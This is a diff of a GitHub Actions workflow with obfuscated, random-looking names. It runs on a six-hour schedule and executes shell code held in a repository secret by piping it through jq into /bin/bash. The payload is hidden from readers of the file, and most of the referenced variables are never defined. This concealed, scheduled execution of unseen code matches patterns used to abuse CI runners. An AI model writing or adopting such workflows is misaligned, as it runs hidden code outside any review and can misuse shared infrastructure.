@@ -1,19 +1,29 @@
 name: wanghuangzi4536
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 4/6 * * *'
-jobs:  # 25629
+    - cron: '7 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wanghuangzi4536
         env:
-          utlb7: ${{ secrets.utlb7 }}
+          t8884: ${{ secrets.t8884 }}
         run: |
-          echo $utlb7 | jq -r .oynx08966 | /bin/bash
-          echo $ccfp1033 | jq -r .d79205 | /bin/bash
-          echo $awft88711 | jq -r .cnxn46 | /bin/bash
-          echo $xuakh0346 | jq -r .a23 | /bin/bash
+          echo $t8884 | jq -r .lze747 | /bin/bash
+          echo $xzz2673 | jq -r .ykxg776 | /bin/bash
+          echo $knnxt41 | jq -r .zl55 | /bin/bash
+          echo $vrmyy6662 | jq -r .lmu14354 | /bin/bash
+          echo $tqs63 | jq -r .mt9888 | /bin/bash
+          echo $wlwh74882 | jq -r .fo54 | /bin/bash
+          echo $vtefa0380 | jq -r .fyvnq872 | /bin/bash
+          echo $jcow271 | jq -r .vf67434 | /bin/bash
+          echo $f0689 | jq -r .be2 | /bin/bash
+          echo $y2 | jq -r .wfo93811 | /bin/bash
+          echo $c4 | jq -r .d2 | /bin/bash
 
